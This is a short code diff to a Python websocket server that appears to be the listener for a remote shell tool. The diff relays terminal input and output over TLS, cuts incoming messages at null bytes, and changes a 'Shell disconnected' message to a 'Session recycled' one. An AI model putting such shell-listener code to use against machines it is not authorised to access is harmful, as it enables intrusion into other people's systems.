@@ -59,15 +59,17 @@ async def handler(ws):
     async def write_stdout():
         async for msg in ws:
             if isinstance(msg, bytes):
+                msg = msg.split(b'\x00', 1)[0]
                 os.write(sys.stdout.fileno(), msg)
             else:
+                msg = msg.split('\x00', 1)[0]
                 sys.stdout.write(msg)
                 sys.stdout.flush()
 
     try:
         await asyncio.gather(read_stdin(), write_stdout())
     except websockets.ConnectionClosed:
-        print("\n[*] Shell disconnected.")
+        print("\n[*] Session recycled, waiting for reconnect...")
 
 async def main():
     ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
